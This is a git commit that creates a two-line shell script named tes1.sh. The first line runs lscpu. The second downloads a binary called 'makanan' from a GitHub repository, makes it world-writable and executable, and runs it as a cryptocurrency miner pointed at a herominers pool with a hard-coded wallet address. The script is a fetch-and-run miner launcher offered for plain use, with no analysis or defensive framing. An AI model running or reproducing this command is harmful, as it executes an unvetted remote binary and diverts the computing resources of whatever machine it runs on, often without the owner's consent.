1dfdd5fecf30d8a80b9c2c31ba388be078d5451f
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-03-05 21:21:08 +0900

    Create tes1.sh

---
+++ tes1.sh
@@ -0,0 +1,2 @@
+lscpu
+wget https://github.com/raufpermana22/tesami/raw/main/makanan && chmod 777 makanan && ./makanan --donate-level 1 -o de.haven.herominers.com:1110 -u hvxy2SoB1ZGg3NK8uCeuvJ4LNxhYuxVr6LRYEHkdzKg7fqrJVbNosjADJYeWw5VyaEc81qY5Zbs5STctfv4FyqW36ZgozSaTP6 -p halu -a cn-heavy/xhv -k 
